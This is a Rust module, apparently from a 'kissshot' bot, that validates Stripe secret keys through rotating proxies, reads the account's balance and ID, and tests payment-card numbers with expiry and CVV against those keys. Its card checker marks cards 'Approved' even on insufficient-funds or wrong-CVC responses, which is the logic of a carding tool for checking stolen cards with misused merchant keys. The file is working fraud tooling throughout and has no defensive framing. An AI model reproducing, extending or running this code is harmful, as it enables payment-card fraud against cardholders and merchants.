use crate::config::get_config;
use crate::database::kvs::{self, get_json, set_json};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use chrono::Utc;
use regex::Regex;
use reqwest;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UserSkSession {
    pub sk: String,
    pub proxy: Option<String>,
    pub validated_at: String,
    pub balance: f64,
    pub currency: String,
    pub account_id: Option<String>,
    pub live: bool,
}

#[derive(Debug, Clone)]
pub struct SkValidationResult {
    pub live: bool,
    pub balance: f64,
    pub currency: String,
    pub account_id: Option<String>,
    pub message: String,
}

#[derive(Debug, Clone)]
pub struct CcSkCheckResult {
    pub approved: bool,
    pub status: String,
    pub response: String,
}

pub fn session_key(user_id: i64) -> String {
    format!("kissshot:sk_session:{}", user_id)
}

pub fn extract_sk(text: &str) -> Option<String> {
    Regex::new(r"sk_(live|test)_\S+")
        .ok()?
        .find(text)
        .map(|m| m.as_str().to_string())
}

pub fn extract_proxy(text: &str) -> Option<String> {
    if let Ok(re) = Regex::new(r"(?i)\b(?:https?|socks4|socks5)://\S+") {
        if let Some(m) = re.find(text) {
            return Some(m.as_str().to_string());
        }
    }

    for token in text.split_whitespace() {
        if token.contains(':') || token.to_ascii_lowercase().starts_with("socks") {
            if let Ok(normalized) = normalize_proxy(token) {
                return Some(normalized);
            }
        }
    }

    if text.contains(':') {
        return normalize_proxy(text.trim()).ok();
    }

    None
}

fn split_proxy_scheme(input: &str) -> (Option<String>, String) {
    let trimmed = input.trim();
    let lower = trimmed.to_ascii_lowercase();
    for prefix in ["socks5://", "socks4://", "socks://", "http://", "https://"] {
        if lower.starts_with(prefix) {
            return (None, trimmed.to_string());
        }
    }
    for prefix in ["socks5", "socks4", "socks", "http", "https"] {
        if lower.starts_with(prefix) {
            let rest = trimmed[prefix.len()..].trim_start();
            if rest.is_empty() {
                continue;
            }
            let scheme = if prefix == "socks" {
                "socks5".to_string()
            } else {
                prefix.to_string()
            };
            return (Some(scheme), rest.to_string());
        }
    }
    (None, trimmed.to_string())
}

fn encode_proxy_component(value: &str) -> String {
    urlencoding::encode(value).into_owned()
}

/// Accepts:
/// - http(s)/socks4/socks5://user:pass@host:port
/// - socks5 host:port:user:pass
/// - user:pass@host:port
/// - host:port:user:pass
/// - host:port
pub fn normalize_proxy(input: &str) -> Result<String, String> {
    let (scheme_hint, body) = split_proxy_scheme(input);
    normalize_proxy_with_scheme(&body, scheme_hint.as_deref().unwrap_or("http"))
}

pub fn normalize_proxy_with_scheme(input: &str, scheme: &str) -> Result<String, String> {
    let input = input.trim().trim_matches('"').trim_matches('\'');

    if input.is_empty() {
        return Err("Empty proxy string".into());
    }

    if input.contains("://") {
        return Ok(input.to_string());
    }

    let scheme_lower = scheme.to_ascii_lowercase();
    let scheme = match scheme_lower.as_str() {
        "socks" => "socks5",
        other => other,
    };

    if input.contains('@') {
        let at_parts: Vec<&str> = input.splitn(2, '@').collect();
        let creds: Vec<&str> = at_parts[0].splitn(2, ':').collect();
        if creds.len() == 2 {
            return Ok(format!(
                "{}://{}:{}@{}",
                scheme,
                encode_proxy_component(creds[0]),
                encode_proxy_component(creds[1]),
                at_parts[1]
            ));
        }
        return Ok(format!("{}://{}", scheme, input));
    }

    let parts: Vec<&str> = input.split(':').collect();
    match parts.len() {
        2 => Ok(format!("{}://{}:{}", scheme, parts[0], parts[1])),
        4 => Ok(format!(
            "{}://{}:{}@{}:{}",
            scheme,
            encode_proxy_component(parts[2]),
            encode_proxy_component(parts[3]),
            parts[0],
            parts[1]
        )),
        n if n > 4 => {
            let pass = parts[n - 1];
            let user = parts[n - 2];
            let port = parts[n - 3];
            let host = parts[..n - 3].join(":");
            Ok(format!(
                "{}://{}:{}@{}:{}",
                scheme,
                encode_proxy_component(user),
                encode_proxy_component(pass),
                host,
                port
            ))
        }
        _ => Err(
            "Invalid proxy format. Use host:port:user:pass or http://user:pass@host:port".into(),
        ),
    }
}

fn is_proxy_connection_error(message: &str) -> bool {
    let msg = message.to_ascii_lowercase();
    msg.contains("request failed")
        || msg.contains("error sending request")
        || msg.contains("connect")
        || msg.contains("proxy")
        || msg.contains("tunnel")
        || msg.contains("timed out")
        || msg.contains("connection reset")
        || msg.contains("invalid proxy")
}

pub fn is_proxy_quota_or_auth_error(message: &str) -> bool {
    let msg = message.to_ascii_lowercase();
    msg.contains("402")
        || msg.contains("quota")
        || msg.contains("407")
        || msg.contains("authentication failed")
        || msg.contains("payment required")
}

struct ProxyParts {
    scheme: String,
    host: String,
    port: u16,
    username: Option<String>,
    password: Option<String>,
}

fn decode_component(value: &str) -> String {
    urlencoding::decode(value)
        .map(|v| v.into_owned())
        .unwrap_or_else(|_| value.to_string())
}

fn parse_proxy_url(url: &str) -> Result<ProxyParts, String> {
    let url = url.trim();
    let (scheme, rest) = url
        .split_once("://")
        .ok_or_else(|| "Invalid proxy URL: missing scheme".to_string())?;

    let (auth, hostport) = match rest.rsplit_once('@') {
        Some((a, h)) => (Some(a), h),
        None => (None, rest),
    };

    let (username, password) = if let Some(a) = auth {
        match a.split_once(':') {
            Some((u, p)) => (
                Some(decode_component(u)),
                Some(decode_component(p)),
            ),
            None => (Some(decode_component(a)), None),
        }
    } else {
        (None, None)
    };

    let (host, port) = match hostport.rsplit_once(':') {
        Some((h, p)) => {
            let port = p
                .parse::<u16>()
                .map_err(|_| format!("Invalid proxy port: {}", p))?;
            (h.to_string(), port)
        }
        None => return Err("Invalid proxy URL: missing port".to_string()),
    };

    Ok(ProxyParts {
        scheme: scheme.to_string(),
        host,
        port,
        username,
        password,
    })
}

async fn probe_http_connect(host: &str, port: u16, user: &str, pass: &str) -> Result<(), String> {
    let addr = format!("{}:{}", host, port);
    let mut stream = TcpStream::connect(&addr)
        .await
        .map_err(|e| format!("Cannot reach proxy at {} — {}", addr, e))?;

    let creds = STANDARD.encode(format!("{}:{}", user, pass));
    let request = format!(
        "CONNECT api.stripe.com:443 HTTP/1.1\r\n\
         Host: api.stripe.com\r\n\
         Proxy-Authorization: Basic {}\r\n\
         Proxy-Connection: Keep-Alive\r\n\r\n",
        creds
    );

    stream
        .write_all(request.as_bytes())
        .await
        .map_err(|e| format!("Failed to write to proxy: {}", e))?;

    let mut buf = vec![0u8; 8192];
    let n = stream
        .read(&mut buf)
        .await
        .map_err(|e| format!("Failed to read proxy response: {}", e))?;
    let response = String::from_utf8_lossy(&buf[..n]).to_string();

    if response.contains(" 200 ") {
        return Ok(());
    }

    if response.contains("402") || response.to_ascii_lowercase().contains("quota") {
        let body = response
            .split("\r\n\r\n")
            .nth(1)
            .unwrap_or("")
            .replace('\n', " ")
            .trim()
            .to_string();
        return Err(format!(
            "Proxy quota exhausted (402). Your proxy account has no traffic balance left. {}",
            body
        ));
    }

    if response.contains("407") {
        return Err("Proxy authentication failed (407). Check username and password.".into());
    }

    let status_line = response.lines().next().unwrap_or("Unknown proxy error");
    Err(format!("Proxy rejected tunnel: {}", status_line))
}

async fn preflight_proxy(proxy_url: &str) -> Result<(), String> {
    let parts = parse_proxy_url(proxy_url)?;
    if parts.scheme == "http" || parts.scheme == "https" {
        let user = parts
            .username
            .ok_or_else(|| "HTTP proxy requires username".to_string())?;
        let pass = parts
            .password
            .ok_or_else(|| "HTTP proxy requires password".to_string())?;
        return probe_http_connect(&parts.host, parts.port, &user, &pass).await;
    }
    Ok(())
}

#[derive(Debug, Clone)]
pub struct ProxyProbeResult {
    pub validation: SkValidationResult,
    pub working_proxy: Option<String>,
}

pub async fn validate_sk_with_proxy_probe(sk: &str, proxy_raw: &str) -> ProxyProbeResult {
    let (scheme_hint, body) = split_proxy_scheme(proxy_raw);
    let schemes: Vec<&str> = if let Some(ref scheme) = scheme_hint {
        vec![scheme.as_str()]
    } else {
        vec!["http", "socks5", "socks4"]
    };

    let mut last = SkValidationResult {
        live: false,
        balance: 0.0,
        currency: String::new(),
        account_id: None,
        message: "Proxy validation failed".to_string(),
    };

    for scheme in schemes {
        let proxy_url = match normalize_proxy_with_scheme(&body, scheme) {
            Ok(url) => url,
            Err(e) => {
                last.message = e;
                continue;
            }
        };

        if scheme == "http" || scheme == "https" {
            if let Err(e) = preflight_proxy(&proxy_url).await {
                last.message = e.clone();
                if is_proxy_quota_or_auth_error(&e) {
                    return ProxyProbeResult {
                        validation: SkValidationResult {
                            live: false,
                            balance: 0.0,
                            currency: String::new(),
                            account_id: None,
                            message: e,
                        },
                        working_proxy: None,
                    };
                }
                continue;
            }
        }

        let result = validate_sk(sk, Some(&proxy_url)).await;
        if result.live {
            return ProxyProbeResult {
                validation: result,
                working_proxy: Some(proxy_url),
            };
        }

        if is_proxy_connection_error(&result.message) {
            last = result;
            continue;
        }

        return ProxyProbeResult {
            validation: result,
            working_proxy: Some(proxy_url),
        };
    }

    ProxyProbeResult {
        validation: last,
        working_proxy: None,
    }
}

pub fn mask_sk(sk: &str) -> String {
    if sk.len() > 20 {
        format!("{}...{}", &sk[..12], &sk[sk.len() - 4..])
    } else {
        sk.to_string()
    }
}

pub fn create_client(proxy_url: Option<&str>) -> Result<reqwest::Client, String> {
    let effective_proxy = if let Some(url) = proxy_url {
        if url.contains("://") {
            Some(url.to_string())
        } else {
            Some(normalize_proxy(url)?)
        }
    } else {
        get_config()
            .ok()
            .and_then(|cfg| cfg.config.proxy.proxy.clone())
            .filter(|p| !p.trim().is_empty())
            .map(|p| {
                if p.contains("://") {
                    Ok(p)
                } else {
                    normalize_proxy(&p)
                }
            })
            .transpose()?
    };

    let mut builder = reqwest::Client::builder()
        .connect_timeout(std::time::Duration::from_secs(20))
        .timeout(std::time::Duration::from_secs(45));

    if let Some(url) = effective_proxy {
        let proxy =
            reqwest::Proxy::all(&url).map_err(|e| format!("Invalid proxy URL ({}): {}", url, e))?;
        builder = builder.proxy(proxy);
    }

    builder
        .build()
        .map_err(|e| format!("Failed to build HTTP client: {}", e))
}

pub async fn load_session(user_id: i64) -> Result<Option<UserSkSession>, String> {
    get_json::<UserSkSession>(&session_key(user_id))
        .await
        .map_err(|e| format!("Failed to load session: {}", e))
}

pub async fn save_session(user_id: i64, session: &UserSkSession) -> Result<(), String> {
    set_json(&session_key(user_id), session, None)
        .await
        .map_err(|e| format!("Failed to save session: {}", e))?;
    Ok(())
}

pub async fn clear_session(user_id: i64) -> Result<(), String> {
    kvs::delete(&session_key(user_id))
        .await
        .map_err(|e| format!("Failed to clear session: {}", e))?;
    Ok(())
}

pub async fn validate_sk(sk: &str, proxy_url: Option<&str>) -> SkValidationResult {
    let client = match create_client(proxy_url) {
        Ok(c) => c,
        Err(e) => {
            return SkValidationResult {
                live: false,
                balance: 0.0,
                currency: String::new(),
                account_id: None,
                message: e,
            };
        }
    };

    let balance_resp = match client
        .get("https://api.stripe.com/v1/balance")
        .header("Authorization", format!("Bearer {}", sk))
        .send()
        .await
    {
        Ok(resp) => resp,
        Err(e) => {
            return SkValidationResult {
                live: false,
                balance: 0.0,
                currency: String::new(),
                account_id: None,
                message: format!("Request failed: {}", e),
            };
        }
    };

    let status = balance_resp.status();
    let body = balance_resp.text().await.unwrap_or_default();

    if !status.is_success() {
        let message = serde_json::from_str::<Value>(&body)
            .ok()
            .and_then(|v| {
                v.get("error")
                    .and_then(|e| e.get("message"))
                    .and_then(|m| m.as_str())
                    .map(|s| s.to_string())
            })
            .unwrap_or_else(|| "Invalid or dead SK".to_string());

        return SkValidationResult {
            live: false,
            balance: 0.0,
            currency: String::new(),
            account_id: None,
            message,
        };
    }

    let balance_data: Value = match serde_json::from_str(&body) {
        Ok(v) => v,
        Err(_) => {
            return SkValidationResult {
                live: false,
                balance: 0.0,
                currency: String::new(),
                account_id: None,
                message: "Invalid balance response".to_string(),
            };
        }
    };

    let balance = balance_data
        .get("available")
        .and_then(|a| a.get(0))
        .and_then(|b| b.get("amount"))
        .and_then(|a| a.as_u64())
        .unwrap_or(0) as f64
        / 100.0;

    let currency = balance_data
        .get("available")
        .and_then(|a| a.get(0))
        .and_then(|b| b.get("currency"))
        .and_then(|c| c.as_str())
        .unwrap_or("usd")
        .to_uppercase();

    let account_id = match client
        .get("https://api.stripe.com/v1/account")
        .header("Authorization", format!("Bearer {}", sk))
        .send()
        .await
    {
        Ok(resp) if resp.status().is_success() => resp
            .json::<Value>()
            .await
            .ok()
            .and_then(|v| v.get("id").and_then(|id| id.as_str()).map(String::from)),
        _ => None,
    };

    SkValidationResult {
        live: true,
        balance,
        currency,
        account_id,
        message: "SK validated successfully".to_string(),
    }
}

pub async fn check_cc_with_sk(
    sk: &str,
    proxy_url: Option<&str>,
    cc: &str,
) -> Result<CcSkCheckResult, String> {
    let parts: Vec<&str> = cc.split('|').collect();
    if parts.len() < 4 {
        return Err("Invalid CC format. Use: number|mm|yy|cvv".to_string());
    }

    let client = create_client(proxy_url)?;

    let pm_resp = client
        .post("https://api.stripe.com/v1/payment_methods")
        .header("Authorization", format!("Bearer {}", sk))
        .form(&[
            ("type", "card"),
            ("card[number]", parts[0]),
            ("card[exp_month]", parts[1]),
            ("card[exp_year]", parts[2]),
            ("card[cvc]", parts[3]),
        ])
        .send()
        .await
        .map_err(|e| format!("Stripe request failed: {}", e))?;

    let body = pm_resp.text().await.unwrap_or_default();
    let data: Value = serde_json::from_str(&body).unwrap_or(Value::Null);

    if data.get("id").and_then(|id| id.as_str()).is_some() {
        return Ok(CcSkCheckResult {
            approved: true,
            status: "Approved ✅".to_string(),
            response: "Payment method created — card valid on this SK".to_string(),
        });
    }

    let error_msg = data
        .get("error")
        .and_then(|e| e.get("message"))
        .and_then(|m| m.as_str())
        .unwrap_or("Unknown decline")
        .to_string();

    let error_type = data
        .get("error")
        .and_then(|e| e.get("code"))
        .and_then(|c| c.as_str())
        .unwrap_or("");

    let approved = error_msg.contains("insufficient funds")
        || error_msg.contains("security code is incorrect")
        || error_msg.contains("incorrect_cvc")
        || error_type == "incorrect_cvc"
        || error_msg.contains("expired card");

    Ok(CcSkCheckResult {
        approved,
        status: if approved {
            "Approved ✅".to_string()
        } else {
            "Declined ❌".to_string()
        },
        response: error_msg,
    })
}

pub fn build_session_from_validation(
    sk: String,
    proxy: Option<String>,
    validation: &SkValidationResult,
) -> UserSkSession {
    UserSkSession {
        sk,
        proxy,
        validated_at: Utc::now().format("%Y-%m-%d %H:%M:%S UTC").to_string(),
        balance: validation.balance,
        currency: validation.currency.clone(),
        account_id: validation.account_id.clone(),
        live: validation.live,
    }
}
